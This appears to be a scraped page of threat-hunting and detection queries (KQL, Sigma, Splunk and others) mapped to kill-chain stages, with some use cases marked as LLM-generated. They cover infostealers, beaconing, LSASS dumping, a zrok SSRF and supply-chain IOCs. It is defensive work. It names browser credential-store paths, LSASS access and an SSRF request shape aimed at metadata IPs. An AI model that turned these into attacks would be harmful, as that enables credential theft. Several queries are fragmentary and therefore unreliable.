| where FileName in~ ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","pwsh")
| join kind=inner kopia_ssh on $left.DeviceId == $right.DeviceId and $left.InitiatingProcessId == $right.SshPid
| where Timestamp between (SshTime .. SshTime + 30s)
| project Timestamp, DeviceName, AccountName, KopiaCmd, SshCmd, ShellImage = FolderPath, ShellCmd = ProcessCommandLine, SshPid
| order by Timestamp desc
let kopia_ssh =
    ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ParentProcessName has_any ("kopia","kopia.exe","kopia-ui","kopia-ui.exe")
    | where ActingProcessName has_any ("ssh","ssh.exe")
    | project SshTime = TimeGenerated, DvcHostname, SshPid = ActingProcessId, SshCmd = ActingProcessCommandLine, KopiaCmd = ParentProcessCommandLine;
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("ssh","ssh.exe")
| where ActingProcessName has_any ("sh","bash","dash","zsh","ksh","cmd.exe","powershell.exe","pwsh.exe","pwsh")
| join kind=inner kopia_ssh on $left.DvcHostname == $right.DvcHostname and $left.ParentProcessId == $right.SshPid
| where TimeGenerated between (SshTime .. SshTime + 30s)
| project TimeGenerated, DvcHostname, ActorUsername, KopiaCmd, SshCmd, ShellName = ActingProcessName, ShellCmd = ActingProcessCommandLine
| order by TimeGenerated desc
(source:linux.auditd OR source:windows.sysmon) @ParentImage:(*/ssh OR *\\ssh.exe OR *\\SSH.EXE) @Image:(*/sh OR */bash OR */dash OR */zsh OR */ksh OR *\\cmd.exe OR *\\CMD.EXE OR *\\powershell.exe OR *\\PowerShell.exe OR *\\pwsh.exe) @CommandLine:(*-c*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^ssh(\.exe)?$/i ImageFileName=/[\\\/](sh|bash|dash|zsh|ksh|cmd\.exe|powershell\.exe|pwsh(\.exe)?)$/i
| join({
    #event_simpleName=ProcessRollup2 ParentBaseFileName=/^kopia(-ui)?(\.exe)?$/i ImageFileName=/[\\\/]ssh(\.exe)?$/i
    | rename(TargetProcessId, as=SshParentPid)
    | select([aid, SshParentPid])
  }, field=[aid, ParentProcessId], key=[aid, SshParentPid], include=[SshParentPid])
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-45695")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-45695")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Microsoft's durabletask package on PyPi Compromised. Mini Shai Hulud attacks aga
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process · OAuth consent / suspicious app grant

C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or SHA1 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc") or MD5 in~ ("069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["069ac1dc7f7649b76bc72a11ac700f373804bfd81dab7e561157b703999f44ce", "3de04fe2a76262743ed089efa7115f4508619838e77d60b9a1aab8b20d2cc8bf", "85f54c089d78ebfb101454ec934c767065a342a43c9ee1beac8430cdd3b2086f", "c0b094e46842260936d4b97ce63e4539b99a3eae48b736798c700217c52569dc"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession

ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",

| project Timestamp, DeviceName, ActionType, FileName,

// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Python process executing transformers.pyz dropped from git-tanstack.com (TeamPCP)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS lookup for git-tanstack.com TeamPCP C2 staging domain · [LLM] Outbound connection to TeamPCP C2 IP 83.142.209.194 · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Installation of malicious guardrails-ai==0.10.1 PyPI package (CVE-2026-45758) Delivery High
Hunts pip/uv/poetry invocations that pin or resolve to the quarantined guardrails-ai 0.10.1 release. Any host that ran this install must be treated as compromised because the malicious code executes on package import, not just install. Rationale: Pivots on the exact malicious release pin string `guardrails-ai==0.10.1` named in the GHSA advisory. SafeDep + Qualys confirm the 0.10.1 PyPI artifact runs malicious code on import; any host that installed it is presumed compromised regardless of whether the dropper fired. Casing variations are covered for path matches. Cross-checked against: • https://github.com/guardrails-ai/guardrails/issues/1473 • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/
ATT&CKT1195.002 T1059.006

| where Timestamp > ago(30d)
| where FileName in~ ("pip.exe","pip3.exe","python.exe","python3.exe","pythonw.exe","uv.exe","poetry.exe")
   or InitiatingProcessFileName in~ ("pip.exe","pip3.exe","uv.exe","poetry.exe")
| where ProcessCommandLine has "guardrails-ai" or ProcessCommandLine has "guardrails_ai"
| where ProcessCommandLine has "0.10.1"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
let LookbackDays = 30d;
union isfuzzy=true
(

  | where EventID == 4688
  | where NewProcessName has_any ("pip.exe","pip3.exe","python.exe","python3.exe","pythonw.exe","uv.exe","poetry.exe")
     or ParentProcessName has_any ("pip.exe","pip3.exe","uv.exe","poetry.exe")
  | where CommandLine has "guardrails-ai" or CommandLine has "guardrails_ai"

),
(

     or TargetProcessName has_any ("pip","pip3","uv","poetry")

description: Detects pip / uv / poetry / python invocations that install or resolve the malicious guardrails-ai==0.10.1 release published 2026-05-11 (TeamPCP supply-chain attack).

[LLM] Python process executing transformers.pyz dropped from git-tanstack.com (TeamPCP) Installation High
Hunts the post-import dropper stage: a python interpreter invoked with the staged payload filename `transformers.pyz` or writing that file to disk. This is the second-stage execution from the malicious guardrails-ai 0.10.1 __init__.py and is shared with the broader TanStack/Mistral mini-Shai-Hulud campaign. Rationale: SafeDep + Qualys reverse-engineered the malicious `guardrails/__init__.py` and identified the exact dropper filename `transformers.pyz` pulled from git-tanstack.com and executed via python3. `.pyz` is a Python zipapp — a high-signal extension on a process command line because legitimate transformers (HuggingFace) ships as a wheel, not a zipapp. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/

[LLM] DNS lookup for git-tanstack.com TeamPCP C2 staging domain Command & Control High
Detects any DNS query for the attacker-controlled domain git-tanstack.com used to host the transformers.pyz second-stage payload in the guardrails-ai 0.10.1 (CVE-2026-45758) and parallel TanStack/Mistral mini-Shai-Hulud campaign. Rationale: git-tanstack.com is the exact attacker domain identified by SafeDep, Qualys and Ox Security as the staging host for the TeamPCP campaign's transformers.pyz payload — the name typosquats the legitimate TanStack open-source org. Any successful resolution from inside the enterprise indicates either active compromise or sandbox detonation. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/ • https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/

[LLM] Outbound connection to TeamPCP C2 IP 83.142.209.194 Command & Control High
Detects any TCP/UDP connection to the attacker-controlled IP 83.142.209.194 hosting git-tanstack.com and the transformers.pyz dropper. Catches DNS-bypass / direct-IP fetches and proxy-tunnelled connections the DNS UC would miss. Rationale: 83.142.209.194 is the canonical IP for git-tanstack.com identified in the pre-extracted IOC bundle and confirmed by the SafeDep + Qualys writeups of the TeamPCP campaign. Direct-IP detection catches dropper variants that hard-code the IP to bypass DNS-based blocks. Cross-checked against: • https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/ • https://qualysec.com/cybersecurity-news/mini-shai-hulud-worm-compromises/

[LLM] zrok ProxyShare SSRF — request path begins with absolute URL (CVE-2026-45568) Exploitation High
Hunts inbound HTTP requests to a zrok Python ProxyShare where the request path itself is an absolute URL (http:// or https://) — the precise shape of the CVE-2026-45568 SSRF, including pivots to cloud metadata services like 127.0.0.1:19190/metadata. Article-specific because Flask + urllib.parse.urljoin only rewrites the host when the second argument is absolute, so this URI shape is the exact attacker vector. Rationale: Article specifies the exact SSRF primitive: a request path that itself is an absolute URL (e.g. http://127.0.0.1:19190/metadata) bypasses urljoin's base-URL anchoring. The Sentinel union targets the two web-server log tables actually populated for App Service and IIS-hosted zrok deployments; the Defender query pivots on the resulting outbound proxy call to link-local / loopback metadata IPs since Defender doesn't expose web access logs. Cross-checked GHSA-jh67-hwqw-m5r7 and the urllib.parse.urljoin RFC-3986 absolute-URI behaviour documented at docs.python.org. Cross-checked against: • https://github.com/advisories/GHSA-jh67-hwqw-m5r7 • https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urljoin • https://nvd.nist.gov/vuln/detail/CVE-2026-45568
ATT&CKT1190 T1090
Data sourcesWeb.Web
// Defender Advanced Hunting has no native web-server log table; this detection lives in IIS / AppService / WAF logs and is expressed on Sentinel side.
// Closest Defender pivot: any process on a zrok-hosting endpoint making an outbound connection to a link-local / loopback metadata IP shortly after receiving inbound traffic on the share.
let MetadataIPs = dynamic(["127.0.0.1","169.254.169.254","169.254.170.2","fd00:ec2::254","100.100.100.200"]);
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("zrok.exe","zrok","python.exe","python3","python","pythonw.exe")
   or InitiatingProcessCommandLine has_any ("zrok share","ProxyShare","zrok.proxy","urllib.parse.urljoin")
| where RemoteIP in (MetadataIPs) or RemoteIP startswith "169.254."
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine,
          RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessAccountName, ReportId
| order by Timestamp desc
// Hunt inbound HTTP requests where the URI itself is an absolute URL (the zrok ProxyShare SSRF shape).
let Lookback = 7d;
let AbsoluteUrlPath = @"(?i)^/+https?:/";
let MetadataMarkers = dynamic(["127.0.0.1","169.254.169.254","metadata.google","metadata.azure","100.100.100.200","/metadata","/latest/meta-data","/computeMetadata"]);
union isfuzzy=true
(
    W3CIISLog
    | where TimeGenerated > ago(Lookback)
    | where csUriStem matches regex AbsoluteUrlPath
         or csUriQuery has_any (MetadataMarkers)
    | project TimeGenerated, _ResourceId, Computer,
              ClientIP = cIP, Method = csMethod,
              UriStem = csUriStem, UriQuery = csUriQuery,
              Status = scStatus, UserAgent = csUserAgent,
              SourceTable = "W3CIISLog"
),
(
    AppServiceHTTPLogs
    | where TimeGenerated > ago(Lookback)
    | where CsUriStem matches regex AbsoluteUrlPath
         or CsUriQuery has_any (MetadataMarkers)
    | project TimeGenerated, _ResourceId, Computer = CsHost,
              ClientIP = CIp, Method = CsMethod,
              UriStem = CsUriStem, UriQuery = CsUriQuery,
              Status = ScStatus, UserAgent = UserAgent,
              SourceTable = "AppServiceHTTPLogs"
)
| extend AbsoluteUrlInPath = iff(UriStem matches regex AbsoluteUrlPath, true, false)
| extend MetadataTargeted = iff(UriStem has_any (MetadataMarkers) or UriQuery has_any (MetadataMarkers), true, false)
| where AbsoluteUrlInPath or MetadataTargeted
| order by TimeGenerated desc

[LLM] Fox Tempest signed-payload SHA256 hash execution Installation High
Detects execution, load, or write of binaries whose SHA256 hashes are attributed by Microsoft Threat Intelligence to Fox Tempest's malware-signing-as-a-service (MSaaS) operation. These two hashes are documented Fox Tempest-signed payloads delivered May 2026 in active intrusions enabling Rhysida/INC/Akira ransomware affiliates. Rationale: Hashes f0668ce... and 11af4566... are the two SHA256 IOCs published in the article's IOC table (Table 2) with last-seen dates of 2026-05-04 / 2026-05-07 — directly attributable to Fox Tempest-signed binaries delivered by Vanilla Tempest / Storm-0501 / Storm-0249 ransomware affiliates. Unioning ProcessExec + ImageLoad + FileWrite catches the payload whether it ran as a top-level process, was sideloaded as a DLL, or just landed on disk pre-detonation.
ATT&CKT1553.002 T1036.001
Data sourcesEndpoint.Processes Endpoint.Filesystem
// Hunt for Fox Tempest-attributed SHA256 hashes across execution, image load, and file write
let FoxTempestHashes = dynamic([
    "f0668ce925f36ff7f3359b0ea47e3fa243af13cd6ad9661dfccc9ff79fb4f1cc",
    "11af4566539ad3224e968194c7a9ad7b596460d8f6e423fc62d1ea5fc0724326"]);
let Lookback = 90d;
union
(DeviceProcessEvents
 | where Timestamp > ago(Lookback)
 | where SHA256 in~ (FoxTempestHashes)
 | project Timestamp, DeviceName, AccountName, EvidenceSurface = "ProcessExec",
           FileName, FolderPath, SHA256, ProcessCommandLine,
           InitiatingProcessFileName, InitiatingProcessFolderPath),
(DeviceImageLoadEvents
 | where Timestamp > ago(Lookback)
 | where SHA256 in~ (FoxTempestHashes)
 | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName,
           EvidenceSurface = "ImageLoad",
           FileName, FolderPath, SHA256,
           ProcessCommandLine = InitiatingProcessCommandLine,
           InitiatingProcessFileName, InitiatingProcessFolderPath),
(DeviceFileEvents
 | where Timestamp > ago(Lookback)
 | where SHA256 in~ (FoxTempestHashes)
 | project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName,
           EvidenceSurface = "FileWrite",
           FileName, FolderPath, SHA256,
           ProcessCommandLine = InitiatingProcessCommandLine,
           InitiatingProcessFileName, InitiatingProcessFolderPath = InitiatingProcessFolderPath)
| order by Timestamp desc
let FoxTempestHashes = dynamic([
    "f0668ce925f36ff7f3359b0ea47e3fa243af13cd6ad9661dfccc9ff79fb4f1cc",
    "11af4566539ad3224e968194c7a9ad7b596460d8f6e423fc62d1ea5fc0724326"]);
union
(ImProcessCreate
 | where TimeGenerated > ago(90d)
 | where SHA256 in~ (FoxTempestHashes)
 | project TimeGenerated, DvcHostname, ActorUsername, EvidenceSurface = "ProcessExec",
           ActingProcessName, ActingProcessCommandLine, SHA256,
           ParentProcessName, ParentProcessCommandLine),
(ImFileEvent
 | where TimeGenerated > ago(90d)
 | where TargetFileSHA256 in~ (FoxTempestHashes)
 | project TimeGenerated, DvcHostname, ActorUsername, EvidenceSurface = "FileWrite",
           ActingProcessName, ActingProcessCommandLine, SHA256 = TargetFileSHA256,
           ParentProcessName = "", ParentProcessCommandLine = "")
| order by TimeGenerated desc

[LLM] Endpoint communication to Fox Tempest MSaaS portal signspace.cloud Command & Control High
